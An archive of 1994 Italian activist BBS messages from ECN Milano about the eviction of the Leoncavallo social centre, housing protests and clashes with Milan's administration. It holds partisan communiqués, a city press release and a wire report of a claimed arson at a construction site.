Questa sera alle 20.30 un gran numero di agenti delle forze dell'ordine hanno
caricato  violentemente le famiglie che da 48 ore bloccavano  parzialmente  il 
Viale Ungheria chiedendo una soluzione da parte del Comune.
Dopo essere state sgomberate dalle loro abitazioni, dopo i numerosi colloqui
richiesti  alle autorita' competenti, costretti a dormire da 50 giorni  dentro 
il  Consiglio di zona 13, dopo essere stati definiti da autorita'  e  giornali  
mafiosi, con tutti i termini atti a indicare un vero e proprio piano di attac-
co  verso persone che se si sono esposte fino a mettersi sulla strade  perche' 
profondamente  convinte di avere tutte le carte in regola per  poter  chiedere 
una casa per diritto.

La violenza delle cosidette forze dell'ordine e' arrivata al punto di pestare
con  "armi alla mano" gli occupanti, arrestando 25 persone che stavano manife-
stando contro il silenzio che la stampa di regime e il nuovo potere  cittadino 
tanto coltivano sui problemi primari che affliggono questa citta' come la casa 
e il lavoro.

Questa azione vergognosa apostrofata anche dagli abitanti del quartiere che
gridavano vergogna nei confronti di chi operava tanto brutalita' nei confronti 
dei  senza casa; e' la conseguenza  tangibile e visibile di un sindaco  total-
mente incompetente per quanto riguarda i bisogni primari dei cittadini di  Mi-
lano, che pensa solamente ai suoi dissidenti interni,  a non risolvere il pro-
blema delle abitazioni in questa citta' coprendo ancora una volta il  patrimo-
nio socialista attraverso la assegnazioni dubbiose partitrocratiche e in odore 
di clientelismo.
Va presa una posizione netta nei confronti di Formentini che non ha saputo
risolvere politicamente il problema della casa ma ancora una volta col  manga-
nello della polizia.

GLI SFRATTATI DI VIA RILKE, CHE PERNOTTANO DA DUE MESI NEL CONSIGLIO DI 
ZONA 13 CONTINUANO LA LORO OCCUPAZIONE E CHIEDONO LA SOLIDARIETA' DI 
TUTTE LE PERSONE COSCIENTI ED INTELLIGENTI, SINCERAMENTE DEMOCRATICHE 
AFFINCHE' SI COSTRINGA IL SINDACO DI MILANO A FARE IL SINDACO DI TUTTI I 
CITTADINI E NON DI CHI ESERCITA I POTERI FORTI IN QUESTA CITTA'. 
  
Milano, 29 luglio '94

  Msg#: 6068                                         Date: 09 Aug 94  14:17
  From: ECN Milano                                   Read: Yes    Replied: No 
    To: all                                          Mark:                     
  Subj: sgomberato il Leoncavallo

questa mattina alle ore 10.00, trecento tra poliziotti e carabinieri hanno
sgomberato il Centro sociale Leoncavallo. All'interno si trovavano 5 compagni,
che sono stati solo identificati. Poi il materiale del centro sociale e' stato
portato in un deposito comunale. il questore Serra ha dichiarato di non vedere
nessun problema sociale ne sedi alternative. E' stato solo eseguito uno
sfratto. Gli occupanti verranno denunciati per violazione di una ordinanza
dell'autorita, quella che imponeva il rilascio dell'immobili. Alle ore 14 la
polizia circonda ancora il centro sociale e si sta tentando un presidio al
parco Alessandrini, vicino all'ortomercato.
Il boia sindaco Formentini ha dichiarato la sua soddisfazione, definendo
definitivamente  morto il centro sociale.


  Msg#: 6070                                         Date: 09 Aug 94  15:45
  From: ECN Milano                                   Read: Yes    Replied: No 
    To: tutti                                        Mark:                     
  Subj: sgomberato centro sociale leoncavallo

milano, 9 agosto 1994
comunicato stampa

alle 10.00 di questa mattina, in una milano ormai deserta, dopo aver
completamente militarizzato la zona est della citta', un ingente numero di 
ps  e cc ha sfondato le porte del Centro Sociale Leoncavallo e sta ora  
procedendo allo sgombero.
Questo e' un atto gravissimo, che evidenzia ulteriormente la precisa volonta'
del sindaco formentini e della sua giunta di cancellare definitivamente dal
territorio tutte quelle realta' sociali e politiche che, da decenni portano
avanti lotte per il diritto alla casa, al reddito, a spazi a uso sociale e
collettivo.

Questo attacco all'opposizione sociale si sta strutturando a piu' livelli,
dalle oltre 850 denunce emesse a carico dei compagni di milano nell'ultimo
anno e mezzo, agli sgomberi di case occupate e centri sociali, ai processi.

Questi straordinari laboratori di lotte sociali e politiche, di sperimentazio-
ne culturale, di aggregazione slegata dalle logiche del profitto, sono l'anima 
democratica, antifascista e viva di territori ormai consegnati nelle mani del-
la speculazione edilizia, dell'eroina e dei poteri forti di questa citta'.

E'  fondamentale ribadire a chi ci vorrebbe assenti dai territori,  che  espe-
rienze come quella del Centro Sociale Leoncavallo, delle case occupate e degli 
altri  centri sociali, non possono venire cancellate dalla storia  presente  e 
futura della citta'.
Lanciamo  quindi un appello a tutte le realta' sociali e politiche, ai  compa-
gni,  ai frequentatori dei centri sociali, affinche' sia evidente a tutti  che 
queste realta', che negli anni sono state patrimonio di migliaia di persone  e 
intelligenze che le hanno attraversate e arricchite, hano pieno titolo e piena 
legittimita' ad esistere e non si lasceranno cancellare dai territori nei qua-
li vivono e agiscono da decine di anni.

Abbiamo indetto una conferenza stampa per oggi alle ore 14 in via salomone 71.

Indiciamo fin da ora una mobilitazione collettiva !!!

Per informazioni: CENTRO SOCIALE LEONCAVALLO
tel. 02 26140287 - 0337 328455
fax 02 26820360

nessuna giustizia nessuna pace


  Msg#: 6141                                         Date: 10 Aug 94  10:52
  From: ECN Milano                                   Read: Yes    Replied: No 
    To: tutti                                        Mark:                     
  Subj: ruspe a villa amantea

questa mattina alle 8,30
la polizia municipale e' intervenuta con le ruspe
a villa amantea, dove ha abbattuto le strutture
del tendone di "su la testa" adiacente al Centro
Sociale Spazzali che vi svolgeva le proprie iniziative


  Msg#: 6145                                         Date: 10 Aug 94  16:22
  From: Lrkwz                                        Read: Yes    Replied: No 
    To: ECN Milano                                   Mark:                     
  Subj: Re: sgombero leoncavallo

ECN Milano il 08-09-94  15:56 scrisse a proposito di 
'sgombero leoncavallo' :-)

 EM> NESSUNA GIUSTIZIA NESSUNA PACE

Si puo' telefonare in tanti al 6236 chiedendo della segreteria del
sindaco (boiardo) per esprimeere la propria protesta.
N.ri alternativi:
 sindaco-capo segreteria s. 86463515
 vice sindaco 865244/877846

purtroppo non mollano il n.ro del fax, si possono solo scrivere lettere.


  Msg#: 6378                                         Date: 13 Aug 94  15:18
  From: snd                                          Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: milano 12 agosto - la chiusura di spazi continua

ieri mattina, venerdi' 12 agosto, alle 10,30 le forze dell'ordine
hanno nuovamente circondato parco alessandrini x imporre che
venissero staccati tutti gli striscioni del leo che erano stati
appesi lungo la rete di recinzione del parco, motivazione:
propaganda abusiva !!!

ridicolo ? abbastanza, se non fosse che CONTEMPORANEAMENTE

un nutrito manipolo della polizia municipale provvedeva a sgomberare
dai locali del consiglio di zona 13 ( in v.le ungheria - a uno sputa
da via salomone ) le 8 famiglie di sfrattati di via rilke che da 2
mesi li stavano occupando

ora il consiglio di zona e' saldamente presidiato
dalla polizia municipale.

attorno alle 21 ps e cc si sono di nuovo schierati davanti al parco
alessandrini per "chiedere" che un furgone, momentaneamente
parcheggiato su un prato, venisse spostato :-(((

scusate, mi scappa da kagare; adesso telefono un attimo in questura
x sapere se posso andare al cesso o se me la devo fare nei pantaloni ...

- a presto -


  Msg#: 6559                                         Date: 18 Aug 94  22:41
  From: snd                                          Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: leo

voila' !!!

l'iniziativa di tre giorni di concerti e - forse - altre cose
di cui era gia' stata negata l'autorizzazione x parco Alessandrini,
non e' stata autorizzata nemmeno nello spiazzo davanti al Centro
Sociale Spazzali.

Ieri il Questore ha comunicato ad alcuni rappresentanti del
Leoncavallo che l'autorizzazione chiesta da 2 consiglieri di
RC all'assessorato comunale competente, era stata negata


   1. i consiglieri d'opposizione di Rifondazione Comunista
     2. chiedono al Comune un'autorizzazione
       3. il Questore
	 4. convoca i rappresentanti del Leo
   * per dire loro che l'autorizzazione di cui sopra non e' concessa

oggi, pikkolo experimendo :
* alcuni compagni vanno con un furgone allo Spazzali ( "presidiato"
  a breve distanza da polizia municipale e forze dell'ordine ) e
* appena scaricati 2 pezzi di palco arriva l'esercito

  "ne' qui ne' la', 'a festa non si fa in tuuutta la citta'" :-)

insomma: la digos affermava che dal Comune di Milano e' stata
emessa un'ordinanza che interdice qualsiasi spazio, pubblico o
privato, in tutta la citta', a qualsiasi genere di manifestazione
pubblica che non sia autorizzata, e che quindi loro dovevano intervenire

non e' stato possibile prendere visione di detta "ordinanza"

subito dopo i vigili urbani hanno accompagnato alcuni tecnici del
comune ad ispezionare la costruzione del centro sociale per
"verificarne la stabilita'".
verifica che ha dato esito positivo, i locali hanno tutti i
requisiti di stabilita' necessari per essere abitabili, ma
non quelli necessari per ospitare manifestazioni pubbliche.

poco piu' tardi u assessore comunale ha dichiarato alla
stampa che in ogni caso nell'area antistante il centro sociale
spazzali, l'azienda energetica municipale aveva gia' messo
in previsione di iniziare DA DOMANI 19 AGOSTO dei lavori di scavo

       quindi allo stato attuale dell'arte
	  * I CONCERTI NON CI SARANNO *

    DOMANI CERCHEREMO COMUNQUE DI "PRENDERCI"
LA PIAZZA ANTISTANTE LO SPAZZALI PER FARCI 3 GIORNI
     DI ASSEMBLEE E DIBATTITI O NON SO CHE'

- a presto -


  Msg#: 6646                                         Date: 21 Aug 94  01:07
  From: snd                                          Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: leo/spazzali

TORDELLI CERCA LO SGOMBERO DELLO SPAZZALI

La giornata di dibattiti prevista dal programma della 3 giorni
antirazzista convocata dal leo presso il centro sociale spazzali,
e' stata caratterizzata da un'imponente dispiegamento forze dell'
ordine fatte intervenire dall'assessore leghista Tordelli - sindaco
pro tempore durante le vacanze di Formentini ( che anche in sardegna
e' stato colpito dall'ormai consueto volantino "in questa citta'
circola un uomo pericoloso ..." grazie allo spirito di iniziativa
di un gruppo di ragazzi del posto :-).

Verso le 19, mentre era in corso l'assemblea dei centri sociali e
delle realta' autogestite milanesi, giungeva notizia di un'operazione
di ammassamento di mezzi di ps e cc all'ingresso del quartiere.

Poco dopo l'intera zona di baggio nel raggio di oltre un chilometro
dal centro sociale e' stata chiusa dai vigili urbani, e i mezzi
della polizia hanno cominciavato a disporsi lungo le strade che portano
al centro sociale.

Da alcuni giornalisti che intanto cominciavano ad arrivare si veniva
a sapere che il sindaco pro tempore, Tordelli, e il presidente
del consiglio comunale, la leghista Gazzola, stavano per arrivare
a Baggio, e che lo schieramento di truppa era dovuto alla loro
imminente presenza. Spiegazione del tutto incongruente con le
dimensioni che stava assumendo il dispiegamento di forze davanti
ai nostri occhi.

Attorno alle 19,30 i mezzi blindati e truppa a terra iniziavano
a circondare l'area ( piuttosto vasta ) in cui si trova il centro
sociale. I compagni presenti - oltre un centinaio - hanno
immediatamente barricato i lati da cui era possibile l'accesso.

Alcuni compagni si recavano dalla Digos per avere spiegazioni,
e contemporaneamente sopraggiungeva il consigliere di RC
"atomo" Tinelli, da cui si veniva a sapere che il sindaco,
dopo aver saputo che ieri sera l'iniziativa si e' svolta
regolarmente, e per di piu' con tanto di CONCERTO e grande
afflusso di gente ( quando la festa della lega riusciva a
malapena a raccogliere un 50/100 persone a sera ), aveva
imposto alla polizia l'intervento al fine di operare uno
sgombero immediato ( l'area del centro sociale e' di proprieta'
comunale ).

Poco dopo giungeva anche il suddetto Tordelli con la Gazzola.
In un primo momento hanno cercato con nonchalance di avviarsi
verso l'ingresso del centro sociale, ma hanno poi desistito,
scoraggiati dall'espressione trucissima dei non pochi
compagni che sono andati loro incontro.

Intanto la notizia si diffondeva in citta' e cominciava ad
arrivare gente, che a piedi riusciva a raggiungere il centro sociale.
Il flusso di persone, anche quelle richiamate dall'iniziativa,
e' continuato per tutta la sera, raggiungendo presto le dimensioni
di ieri, nonostante si dovesse lasciare la macchina molto distante
e attraversare diversi blocchi di schieramenti di forze dell'
ordine.

Si e' deciso di restare tutta la notte ( facendo anche dei turni
per dormire ) e di riprendere domani l'iniziativa, con la
discussione per prepare la convocazione del corteo nazionale
del 10 settembre.

Il concerto non si e' potuto svolgere e il centro sociale
Spazzali sara' probabilmente ( anzi sicuramente, secondo le
valutazioni dei presenti e voci di fonti diverse ) sgomberato
nei primi giorni ( lunedi' o martedi' ) della settimana entrante.

- a presto -


  Msg#: 6762                                         Date: 23 Aug 94  14:08
  From: snd                                          Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: leo

strutture e compagni del leoncavallo sono, ancora per
qualche giorno, ospiti del centro sociale spazzali,
in via amantea, quartiere baggio (mm bandenere + bus 67 )

questa mattina l'azienda elettrica municipale ha staccato
acqua ed elettricita' al centro sociale spazzali, e sono
inoltre iniziati i lavori delle ruspe x costruire, nell'area
un tempo occupata dal tendone di "su la testa", un parcheggio
ed una strada ...



  Msg#: 6763                                         Date: 24 Aug 94  00:49
  From: snd                                          Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: spazzali

acqua e corrente, staccati stamattina come promesso
dal sindaco estivo nei giorni scorsi, questo pomeriggio
sono stati riattacati

lo spazzali e' intestatario di regolari contratti ed ha
altrettanto regolarmente pagato le bollette

si pensa che che la sospensione delle forniture sia stata
dovuta ai lavori di scavo iniziati oggi nello spiazzo
dietro al centro sociale, per costruire una strada ed
un parcheggio

l'azienda energetica municipale non ha fornito spiegazioni
ne' aveva dato formale comunicazione della sospensione,
sia pure temporanea, dei servizi


  Msg#: 6146                                         Date: 10 Aug 94  16:09
  From: snd                                          Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: sgombero point ecn-leoncavallo

ola'

una piccola curiosita' "a latere" dello sgombero del leo:

i digotti, nello sgombero del Leoncavallo
dai locali della Krupp, si sono portati anche
due "experti informatici", che hanno provveduto sul posto
ad eseguire un accurato backup dell'HD del PC
su cui c'era il point ecn del leo ( 45:1917/1.71 )
e tutto il materiale dei vari collettivi, gruppi,
singoli, "amministrazione", ecc.

piu' tardi nella giornata ci e' stato possibile
portare via il PC


 ! Origin: European Counter Network - Milano (45:1917/1)
SEEN-BY: 1/1 5/1 9/1 10/2 999/999 1000/1 4 1100/1 1200/1 2 5 6 1400/1
SEEN-BY: 1500/1 1600/1 1800/1 1900/1 1917/1 2 3 11 2000/1

  Msg#: 6205                                         Date: 11 Aug 94  20:44
  From: Gomma                                        Read: Yes    Replied: No 
    To: snd                                          Mark:                     
  Subj: sgombero point ecn-leoncavallo

Ciao snd:

 > due "experti informatici", che hanno provveduto sul posto
 > ad eseguire un accurato backup dell'HD del PC
 > su cui c'era il point ecn del leo ( 45:1917/1.71 )
 > e tutto il materiale dei vari collettivi, gruppi,
 > singoli, "amministrazione", ecc.

Non  riesco a capire a quale titolo e con quale diritto. Sui giornali il  que-
store  Serra ha affermato che niente era stato posto sotto  sequestro.  Com'e' 
possibile  dunque, se un PC non e' posto sotto sequestro, o non  sia  indagato 
per qualche ragione il proprietario del PC, che i dati vengano copiati e
trattenuti?  Mi sembra una palese violazione del diritto alla privacy.  Dentro 
la macchina vi potevano essere corrispodenze private, ad esempio, o file
riguardanti la sfera privata di qualcuno.
E' stata data qualche giustificazione o vi siete accorti dell'accaduto solo
successivamente?


  From: ECN Milano                                   Read: Yes    Replied: No 
  Subj: comunicato c.s. leoncavallo

Comunicato Stampa

Nella mattina di oggi, mercoledi' 24 agosto 1994 il Centro sociale
Leoncavallo ha presentato alla Questura di Milano un preavviso per
lo svolgimento  di una  manifestazione pubblica.  L'iniziativa, un
presidio permanente  dal giorno  27 agosto  al giorno 4 settembre,
si terra'  in via  Bertelli, a  fianco dell'anfiteatro  del  Parco
della    Martesana,  da  anni  in  stato  di  totale  e  colpevole
abbandono.
Dopo la farsa intrapresa dal  sindaco d'agosto Tordelli allo scopo
di debellare  l'illegalita' nella citta' di Milano e gli avversari
politici  dell'amministrazione,   nel  corso  dei  tre  giorni  di
iniziativa tenutasi  presso il  centro sociale Spazzali di Baggio,
ragione vorrebbe  che venisse risparmiata alla citta' una penosa e
rischiosa replica.  A  tale  scopo  non  sono    previsti  atti  o
attivita' soggette a iter autorizzativi del Comune di Milano: ogni
ulteriore divieto  allo svolgimento  delle iniziative  del  Centro
Sociale   leoncavallo   ricade   pertanto   esclusivamente   nella
violazione,  sistematica  in  questa  citta',  delle  liberta'  di
organizzazione ed espressione politica.
Leggiamo inoltre  con stupore  dalla stampa quotidiana  le vicende
relative al  miliardo di  danni che  sarebbe stato  arrecato  alla
palazzina di  via Salomone  71 di  proprieta' della ditta Krupp; a
tale  proposito   abbiamo  sempre   rilevato  come   non   possano
considerarsi danni,   bensi'  migliorie, alcune,  tra l'altro,  di
indiscutibile pregio,  le  trasformazioni  apportate  al  fine  di
trasformare   l'uso di  detto immobile al fine di renderlo atto ad
accogliere attivita'  di tipo  sociale e  comunitario.  Tutt'altra
cosa sono  i danni  arrecati allo stabile dalla polizia che, senza
scrupolo   alcuno,   hanno   demolito   muri   e   divelto   porte
nell'esecuzione  della   "difficile"  operazione  sgombero  del  9
agosto. Rileviamo  inoltre che  la spesa  sostenuta dallo stato al
fine di  consentire sulla vicenda del  Leoncavallo la speculazione
di molteplici  parti politiche,  avrebbe consentito  l'allocazione
di decine  di realta' associative e l'esplicazione di innumerevoli
servizi.
Avvicinandosi la  ripresa  dell'attivita'  produttiva  e  politica
nella citta',  nella quale  comprendiamo anche  la  manifestazione
nazionale del  10 settembre   e  tre giorni di iniziativa politico
culturali ad  essa connessi  ( il  9/10/11  settembre )  riteniamo
debbano cessare  le provocazioni  operate dalla  giunta di  Milano
contro le  realta' sociali  oggetto in questa estate di  insensato
attacco.


Milano, 23 agosto 1994
Centro Sociale Leoncavallo

-!-
 ! Origin: European Counter Network - Milano (45:1917/1)
SEEN-BY: 1/1 5/1 9/1 30/1 1000/1 4 1100/1 1200/1 5 7 1400/1 1500/3 1600/1
SEEN-BY: 1800/1 1900/1 1917/1 2 3 11 2000/1


  Msg#: 6887                                         Date: 25 Aug 94  18:14
  From: ECN Milano                                   Read: Yes    Replied: No 
    To: tutti                                        Mark:                     
  Subj: com. stampa Comune di Milano

Comune di Milano
Ufficio Stampa

25 agosto 1994

E' pervenuta all'Amministrazione comunale una richiesta di occupazione di suo-
lo pubblico, da parte dei signori D.F. e M.M., per un presidio in via Bertelli
(parco Martesana), dalle ore 14 di sabato 27 agosto alle 23.00 di domenica 4
settembre.

L'Amministrazione comunale ha ritenuto di non accogliere la richiesta, non
essendo possibile concedere il Parco della Martesana, sia perche' non usuale
che simili manifestazioni si svolgano all'interno di parchi, sia perche' ne
potrebbe derivare un dano al tappeto erboso.

In alternativa, l'Amministrazione ha concesso ai signori D.F. e M.M., sotto la
loro  responsabilita', l'occupazione di suolo pubblico in piazza  Lima,  dalle 
ore 7.30 alle ore 19.30, nei giorni 27 e 28 agosto (per due giorni quindi, co-
me  di consuetudine con altri Enti e associazioni) per effettuare la  raccolta 
firme.

La concessione e' subordinata al rispetto dei regolamenti vigenti ed e'
revocabile in qualsiasi momento.

Le decisioni dell'Amministrazione sono state comunicate ai signori D. e M. nel
pomeriggio di oggi.

  Msg#: 6888                                         Date: 25 Aug 94  18:23
  From: ECN Milano                                   Read: Yes    Replied: No 
    To: tutti                                        Mark:                     
  Subj: Com Stampa C.S. Leoncavallo

Centro Sociale LEONCAVALLO

COMUNICATO STAMPA

IL RIDICOLO E L'ARBITRIO

Milano, 25 agosto 1994

Nella giornata di oggi il Comando dei Vigili Urbani ha dato risposta alla
richiesta di autorizzazione per "occupazione di suolo pubblico", avanzata
"secondo i termini di legge" dal Centro Sociale Leoncavallo, con un banchetto
per la raccolta di firme che avrebbe dovuto tenersi da sabato 27 agosto a
domenica 4 settembre in via Bertelli presso il Parco della Martesana, nel cor-
so di un presidio permanente.

Si tratta di un normale atto amministrativo, quotidianamente assolto dai
comandi di zona dei Vigili Urbani, in caso di petizioni popolari e raccolte di
firme da parte di associazioni e anche di normali cittadini.

I Vigili Urbani hanno comunicato che l'Assessorato al Traffico, Trasporti e
Viabilita' aveva INVECE autorizzato un banchetto in piazza Lima, dalle 7,30
alle 19,30, per i soli giorni 27 e 28 agosto, adducendo quale giustificazione
di questo arbitrio che "PER CONSUETUDINE a Milano le raccolte di firme si fan-
no in piazza Lima" !!!

Ricordiamo che la richiesta di via Bertelli e' motivata dalla precisa volonta'
- piu' volte espressa in questi mesi dai centri sociali autogestiti - di esse-
re presenti in quelle allre della citta' dove piu' palesi sono il degrado e
l'abbandono da parte dell'amministrazione pubblica.
Nel Parco della Martesana e' sito un anfiteatro da 700 posti e una struttura
coperta di 500 mq costruita 2 anni fa da un'impresa edile a compensazione di
oneri di urbanizzazione, e destinata ad usi sociali, MAI PRESA IN CONSEGNA DAL
COMUNE.

La motivazione addotta da Palazzo Marino e' un palese pretesto per esercitare
l'ennesimo arbitrio nei confronti dei centri sociali autogestiti, poiche' l'u-
so della stessa area e' gia' stato autorizzato in passato per iniziative simi-
li,  ultima delle quali quella tenuta agli inizi di giugno dal Partito  Umani-
sta.

  Msg#: 6925                                         Date: 26 Aug 94  16:21
  From: ECN Milano                                   Read: Yes    Replied: No 
    To: tutti                                        Mark:                     
  Subj: leo alla martesana

Milano, 26 agosto 1994
COMUNICATO STAMPA

Mentre qualche giornale straparla di agguati a base di pane secco,
uova e porfido (?) ben piu' serio attentato il Comune di Milano va
preparando ai  danni della liberta' di espressione ed associazione
politica.
Domani alle ore 14,30 il Centro Sociale Leoncavallo si rechera' in
via Bertelli per iniziare il presidio permanente preannunciato nei
termini di legge all'autorita' di Pubblica Sicurezza.
A tale  proposito informiamo  che nessun  divieto e' stato posto a
tale  iniziativa  non  essendo  tra  i  compiti  istituzionali  di
qualsivoglia ufficio comunale regolare le liberta' politiche nella
citta' di  Milano. In mancanza di ulteriori accadimenti il divieto
imposto dalla vigilanza urbana riguarda soltanto la presenza di un
banchetto atto alla raccolta di firme.
Nel corso  dell'iniziativa verra' denunciato lo stato si colpevole
abbandono in  cui versa  l'anfiteatro sito  ai margini  del  Parco
della  Martesana   come  del  resto  svariati  altri  immobili  di
proprieta' comunale.  A tale  scopo verra' organizzata la raccolta
degli innumerevoli  stratificati reperti  (siringhe...) di  cui e'
dotata da  anni la  struttura e  la  loro  consegna  all'autorita'
comunale.
Ringraziamo sentitamente  la vigilanza urbana per l'autorizzazione
concessa per  i giorni  27/28 agosto in piazza Lima e valutando se
accettarla, ricordiamo pero' che nessuna l'ha mai chiesta.
Contiamo sulla  presenza del  Sindaco Formentini  per  constatare,
come gia'  il suo  sostituto  Tordelli,  che  non  vengano  tenuti
pericolosi concerti  nel corso dell'iniziativa e informiamo fin da
subito la  vigilanza urbana, l'autorita' di Pubblica Sicurezza, la
Protezione Civile...  che la  prevista  proiezione  serale  verra'
regolarmente effettuata  con due grossi autonomi che reggeranno lo
schermo e  due piu' piccoli con in mano il proiettore; l'eventuale
autorizzazione per  l'occupazione  di  suolo  pubblico  non  avra'
pertanto superficie superiore a otto piedi.

Centro Sociale Leoncavallo

  Msg#: 6926                                         Date: 26 Aug 94  16:47
  From: ECN Milano                                   Read: Yes    Replied: No 
    To: tutti                                        Mark:                     
  Subj: leonka vive, milano brucia

ANSA - MILANO 26 AGOSTO

Un incendio ha distrutto la scorsa notte tre prefabbricati adibiti
a uffici  e spogliatoi  per operai nel cantiere edile che sorge in
via Leoncavallo a Milano nell'area della vecchia sede dell'omonimo
centro sociale.
Stamane alla redazione milanese dell'ANSA e' giunta una telefonata
di rivendicazione:  "questa e'  una  rivendicazione,  non  e'  uno
scherzo -  ha detto  una voce  maschile  -  questa  notte  abbiamo
colpito il  cantiere di  via  Leoncavallo.  Contro  il  divieto  a
manifestare.  Sul   Leoncavallo  non  costruirete  niente.  Azione
Diretta".
Secondo i  primi accertamenti condotti dalla polizia sul luogo non
sono stati  trovati segni  di liquido  infiammabile, ma  non viene
esclusa la  matrice dolosa  dell'incendio. Un  cancello  in  ferro
all'angolo fra  via Mancinelli  e via  Leoncavallo, dal  quale  si
accede al  cantiere e'  stato trovato  aperto. Le  fiamme si  sono
sviluppate verso  le 3  e l'intervento  dei vigili  del  fuoco  e'
durato circa  un'ora e  mezza. L'impresa  Morganti di  Milano  che
coordina i  lavori per  la costruzione  di un condominio sull'area
che per  circa vent'anni  ha ospitato  la sede  storica del centro
Leoncavallo non  ha  ancora  fatto  un  bilancio  dei  danni,  che
ammonterebbero comunque a qualche decina di milioni di lire.

Intanto non  e' stata presentata alcuna denuncia nei confronti dei
giovani  del   centro  leoncavallo,   sorpresi  ieri   nei  pressi
dell'aeroporto di Linate proprio mentre arrivava in aereo da Olbia
il sindaco di Milano Marco Formentini. Secondo la Digos e i vigili
urbani, il  gruppo stava  forse preparando  una protesta contro il
sindaco.  Dietro  un  cespuglio  sono  stati  trovati  cubetti  di
porfido, uova,  pezzi  di  pane  secco  e  una  tanica  contenente
detewrsivo. Poco  distante,  appeso  ad  un  sottopasso  in  viale
Forlanini, la  strada che  dall'aeroporto porta  verso  il  centro
citta', c'era  uno striscione  con la scritta "LEONKA VIVE, MILANO
BRUCIA".
Oggi il centro sociale ha comunicato che domani si rechera' in via
Bertelli all'interno  del parco  della Martesana per denunciare lo
stato di  abbandono in  cui versa  l'anfiteatro e  altri  immobili
comunali. Ieri  l'amministrazione comunale  aveva reso noto di non
aver concesso  l'autorizzazione al  presidio in via Bertelli dando
il via  libera invece  per una  raccolta di  firme in piazza Lima.
"Ringraziamo per  l'autorizzazione concessa in piazza Lima - hanno
scritto  i  leoncavallini  in  un  comunicato  diffuso  oggi  -  e
valutando se  accettarla ricordiamo  pero' che  nesuna l'aveva mai
chiesta".

  Msg#: 6927                                         Date: 26 Aug 94  16:48
  From: ECN Milano                                   Read: Yes    Replied: No 
    To: tutti                                        Mark:                     
  Subj: da domani alla martesana

quindi da domani saremo al parco della martesana,
in via bertelli, mm gorla - bus 56

se non ci sara' consentito saremo altrove   :-)

  Msg#: 6928                                         Date: 27 Aug 94  01:04
  From: snd                                          Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: leo

i vigili urbani hanno piazzato fin da questo pomeriggio
una macchina proprio davanti all'anfiteatro di parco
martesana ( paura, eh ?!? )

l'appuntamento e' comunque confermato  :-)

  Msg#: 7008                                         Date: 27 Aug 94  16:49
  From: snd                                          Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: sgomberato c.s. barricate a parma

SGOMBERATO IL CSOA BARRICATE  (Parma)

Martedi' 23  Agosto, Digos,  polizia  e  vigili  urbani,  per
ordine del sindaco Lavagetto (PDS) hanno sgomberato il centro
sociale autogestito "barricate" dopo che l'occupazione si era
protratta per  piu' di  9 mesi per la quarta volta in meno di
due anni  i poteri  forti della  citta'  (massoneria,  unione
industriali, partiti,  polizia) usano la violenza per colpire
il bisogno di spazi di autogestione e di organizzazione delle
lotte proletarie  contro la  vita alienata che il sistema del
dominio impone  ogni giorno  sul lavoro,  nella  scuola,  nel
tempo libero.
Il massone  Lavagetto e  i suoi  servi  non  si  illudano  di
risolvere in questo modo la questione degli spazi sociali. La
contraddizione e'  forte e  si ripropone ogni giorno: ieri un
altro morto  di eroina  ci ha  fatto comprendere  ancora  una
volta come  anche Parma  non abbia  un'alternativa sociale  e
culturale alla disperazione ed alla solitudine.
Il nostro  centro sociale  e'  stato  un  tentativo  di  dare
un'alternativa umana  e  socialmente  positiva  a  un  grande
spazio  inutilizzato   e  destinato   allo  sfacelo   o  alla
speculazione.
Il nostro  sindaco e  il suo  partito - PDS - legati a doppio
filo all'unione  industriali e ai poteri occulti della citta'
legittimano con la loro partecipazione attiva le manovre piu'
sporche di  speculazione edilizia sulle "aree dismesse" (vedi
ruolo della SINCO, cooperativa vicino al PDS e gli arresti di
alcuni dei  dirigenti del  partito in relazione allo scandalo
dell'ex Robuschi).  Il "nostro" sindaco e' poi stranamente il
notaio che  sancisce l'operazione  di acquisto  dell area  ex
Robuschi da  parte del  consorzio di imprenditori "La corte".
La differenza  del'"progressista" Lavagetto  ed  il  leghista
Formentini  che   ha  sgomberato  il  csoa  Leoncavallo  sono
inesistenti:  in   realta'  Lavagetto   e'  come  Formentini.
Promettiamo al  sindaco e  al PDS  che lui  ed "i suoi amici"
pagheranno tutte le conseguenze politiche di questo sgombero.

Nessuna giustizia nessuna pace

collettivo spazi sociali
CSOA BARRICATE - PARMA


  Msg#: 7009                                         Date: 27 Aug 94  16:56
  From: snd                                          Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: leoncavallo alla martesana

questo pomeriggio alle 14,30 (come da programma)
la comunita' nomade del leoncavallo si e' felicemente
insediata presso l'anfiteatro del parco della
martesana, in via bertelli (venendo da via padova si gira
in via agordat e poi sempre dritto - sono 200 m )

poiche' il comune di milano ha proibito la raccolta di
firme prevista, questa la faremo un'altra volta  :-)))

il posto e' incantevole, accorrete numerosi !!!

  Msg#: 7057                                         Date: 28 Aug 94  02:33
  From: snd                                          Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: comunicato c.s. leoncavallo

FORMENTINI COME BRAMIERI

Che Formentini fosse "il sindaco di tutti i milanesi" lo
scrivono da tempo i quotidiani ma che fosse anche il comico
(e che comico!) di tutti i milanesi questo dovevamo ancora
scoprirlo.
Come dobbiano altrimenti interpretare le dichiarazioni
pubbliche apparse oggi sui quotidiani se non come barzellette
della miglior tradizione?
Ecco cosi' che un contenitore di detersivo (perche' anche i
leoncavallini si lavano??!!!) diventa subito "diserbante (che
e' infiammabile)", quattro volantini appesi allegramente per
le strade di Courmayeur diventano una "spedizione
squadristica". E le uova: anche se comprate in giornata
quelle degli autonomi sono sempre "marce"!
Che la signora Augusta poi non si senta tranquilla "nemmeno
quando va dal parrucchiere", beh e' un problema tutto suo.
Noi non possiamo fare altro che consigliarle di cambiare
parrucchiere.
Per quanto riguarda poi il "disprezzo della gente" crediamo
invece che sempre maggiore sia l'insofferenza verso
l'inettitudine dell'amministrazione leghista, e basterebbe al
"sciur sindich" e signora girare la citta' in tram invece che
scortati sulle loro auto di rappresentanza.
Ci sarebbe solo da ridere, se non fosse che affermazioni
cosi' deliranti (purtroppo non dettate solo dal sole
d'agosto) servoo a coprire l'inefficienza di un sindaco e di
